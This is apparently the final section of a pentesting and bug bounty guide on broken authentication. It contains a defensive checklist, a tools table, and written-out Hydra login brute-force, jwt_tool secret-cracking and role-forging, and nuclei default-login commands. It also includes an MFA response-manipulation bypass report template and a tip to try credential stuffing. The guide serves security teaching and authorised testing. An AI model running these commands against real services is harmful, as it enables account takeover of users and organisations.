- [x] Implement JWT revocation list for logout
- [x] Enforce MFA for sensitive accounts and actions
- [x] Use TOTP with single-use code enforcement (prevent replay)
- [x] Validate OAuth `state` parameter to prevent CSRF
- [x] Restrict `redirect_uri` to exact registered values — no wildcards
- [x] Log all authentication events with timestamp, IP, and user agent
- [x] Alert on suspicious patterns (many failed logins, logins from new countries)
- [x] Implement CAPTCHA after N failed login attempts
- [x] Change default credentials on all services before deployment

---

## Authentication Testing Tools

| Tool | Description | Link |
|------|-------------|------|
| **Burp Suite** | Intercept, modify, and replay authentication requests | [portswigger.net](https://portswigger.net/burp) |
| **Hydra** | Fast network login cracker supporting many protocols | [GitHub](https://github.com/vanhauser-thc/thc-hydra) |
| **Medusa** | Parallel password brute forcer | [GitHub](https://github.com/jmk-foofus/medusa) |
| **jwt_tool** | Swiss army knife for JWT testing and exploitation | [GitHub](https://github.com/ticarpi/jwt_tool) |
| **hashcat** | GPU-accelerated password recovery and JWT cracking | [hashcat.net](https://hashcat.net) |
| **ffuf** | Fast web fuzzer for brute forcing login endpoints | [GitHub](https://github.com/ffuf/ffuf) |
| **nuclei** | Template-based scanner with many auth checks built in | [GitHub](https://github.com/projectdiscovery/nuclei) |
| **oauth2-proxy** | Test OAuth flows and misconfigurations | [GitHub](https://github.com/oauth2-proxy/oauth2-proxy) |

### Tool Usage Examples

**Hydra — HTTP Form Brute Force:**

```bash
hydra -L usernames.txt -P passwords.txt \
  vulnerable-app.com \
  http-post-form \
  "/api/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
  -t 10 -w 3 -v
```

**jwt_tool — All-in-One JWT Testing:**

```bash
# Install
pip3 install jwt_tool

# Decode and analyze a JWT
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Test for 'none' algorithm vulnerability
python3 jwt_tool.py eyJ... -X a

# Brute force the secret
python3 jwt_tool.py eyJ... -C -d /usr/share/wordlists/rockyou.txt

# Test algorithm confusion (RS256 -> HS256)
python3 jwt_tool.py eyJ... -X k -pk public_key.pem

# Inject into all JWT fields and fuzz
python3 jwt_tool.py eyJ... -I -pc role -pv administrator
```

**nuclei — Authentication Checks:**

```bash
# Run all authentication-related templates
nuclei -u https://vulnerable-app.com \
  -t nuclei-templates/vulnerabilities/auth/ \
  -t nuclei-templates/exposures/tokens/ \
  -t nuclei-templates/default-logins/ \
  -o auth-results.txt -v

# Check for default credentials only
nuclei -u https://vulnerable-app.com \
  -t nuclei-templates/default-logins/ \
  -v
```

---

## Broken Authentication in Bug Bounty — Tips & Tricks

### Where to Look

1. **Login endpoints** — Brute force, rate limiting, enumeration
2. **Password reset flows** — Token strength, expiry, host header injection
3. **"Remember Me" cookies** — Token predictability and entropy
4. **JWT tokens** — Algorithm, secret strength, claims validation
5. **OAuth integrations** — State parameter, redirect_uri, token leakage
6. **MFA endpoints** — Brute force OTP, skip step, response manipulation
7. **Registration flow** — Username enumeration, weak initial passwords
8. **API authentication** — API keys in URLs, no expiry, over-privileged
9. **Session management** — Fixation, no regeneration, long-lived tokens
10. **Single Sign-On (SSO)** — SAML injection, signature bypass, XML attacks

### Bug Bounty Report Template

```text
## Title
[Authentication Bypass] — Broken MFA via Response Manipulation at /api/mfa/verify

## Summary
The MFA verification endpoint at `POST /api/mfa/verify` trusts a client-side
success indicator in the response. By intercepting and modifying the server
response, an attacker who knows a valid username and password can bypass MFA
entirely and gain full account access.

## Severity
Critical — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8)

## Steps to Reproduce
1. Log in with valid credentials (username:password)
2. Server returns pre_auth_session cookie and redirects to /mfa
3. Submit an incorrect OTP code (e.g., 000000)
4. Intercept the server response in Burp Suite
5. Change response body from:
   {"success": false, "mfa_required": true}
   to:
   {"success": true, "mfa_required": false}
6. Forward the modified response
7. Application grants full authenticated access

## Impact
- Complete bypass of Multi-Factor Authentication
- Full account takeover for any account with known credentials
- Compromises the additional security layer entirely
- Affects all user accounts including administrators

## CVSS Score
8.8 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Remediation
1. Perform ALL authentication state validation server-side
2. Never trust client-supplied success indicators
3. Use server-side session flags to track MFA completion
4. Verify MFA state on every protected endpoint, not just the redirect
```

> JWT algorithm confusion, OAuth state bypass, and MFA bypass bugs frequently rate as **Critical** ($5,000–$50,000+). Even basic brute force with no lockout can rate as **Medium** to **High** depending on the target and program scope.
{: .prompt-tip }

---

## Notable Broken Authentication CVEs

| CVE | Application | Impact | CVSS |
|-----|-------------|--------|------|
| CVE-2022-22965 | Spring Framework | Authentication bypass via data binding | 9.8 |
| CVE-2021-40539 | Zoho ManageEngine | Authentication bypass leading to RCE | 9.8 |
| CVE-2020-5902 | F5 BIG-IP | Authentication bypass in TMUI | 9.8 |
| CVE-2022-1388 | F5 BIG-IP | iControl REST auth bypass | 9.8 |
| CVE-2023-34362 | MOVEit Transfer | Auth bypass + SQL injection | 9.8 |
| CVE-2021-26855 | Microsoft Exchange | SSRF auth bypass (ProxyLogon) | 9.8 |
| CVE-2019-19781 | Citrix ADC | Path traversal auth bypass | 9.8 |
| CVE-2022-0185 | Linux Kernel | Capability check bypass | 8.4 |
| CVE-2023-20198 | Cisco IOS XE | Privilege escalation auth bypass | 10.0 |
| CVE-2024-3400 | Palo Alto PAN-OS | Command injection auth bypass | 10.0 |

---

## Labs & Practice Resources

### Free Labs

1. **[PortSwigger Web Security Academy — Authentication Labs](https://portswigger.net/web-security/authentication)**
   - Username enumeration via different responses
   - 2FA simple bypass
   - Password reset broken logic
   - Password brute-force via password change
   - Broken brute-force protection, IP block
   - JWT authentication bypass via unverified signature
   - JWT authentication bypass via flawed signature verification
   - JWT authentication bypass via weak signing secret
   - JWT authentication bypass via algorithm confusion

2. **[TryHackMe — Authentication Bypass Room](https://tryhackme.com/room/authenticationbypass)**

3. **[OWASP WebGoat — Authentication Flaws](https://owasp.org/www-project-webgoat/)**

4. **[DVWA — Brute Force Module](https://github.com/digininja/DVWA)**

5. **[HackTheBox — Starting Point: Archetype, Oopsie](https://www.hackthebox.com/)**

---

## Conclusion

Broken authentication vulnerabilities remain **some of the most impactful and commonly found flaws** in modern applications. A single weak session token, missing rate limit, or JWT algorithm confusion can hand an attacker the keys to thousands of user accounts.

### Key Takeaways

| For Developers | For Pentesters |
|---------------|---------------|
| Use Argon2id or bcrypt for all passwords | Test every auth endpoint for rate limiting |
| Generate session tokens with 256+ bits of randomness | Try credential stuffing with known leaked DB pairs |
| Always regenerate session IDs after login | Check JWTs for weak secrets and none algorithm |
| Enforce MFA and validate it fully server-side | Test password reset token predictability |
| Never use Host header to build reset URLs | Try host header injection on forgot-password |
| Pin JWT algorithms — never allow `none` | Test MFA bypass via response manipulation |
| Return identical errors for login failures | Enumerate accounts via timing or error messages |
| Implement lockout AND rate limiting | Check OAuth state parameter and redirect_uri |
| Set short expiry on all tokens and sessions | Chain findings for maximum impact |
| Log and alert on all suspicious auth activity | Always escalate to account takeover PoC |

---

## References

- [OWASP — A07:2021 Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [PortSwigger — Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [HackTricks — Broken Authentication](https://book.hacktricks.xyz/pentesting-web/login-bypass)
- [PayloadsAllTheThings — Authentication Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Authentication%20Bypass)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [jwt_tool — JWT Testing Toolkit](https://github.com/ticarpi/jwt_tool/wiki)
- [RFC 6749 — OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)

---

*Last updated: January 20, 2024*
*Author: Security Researcher*
*License: MIT*
````
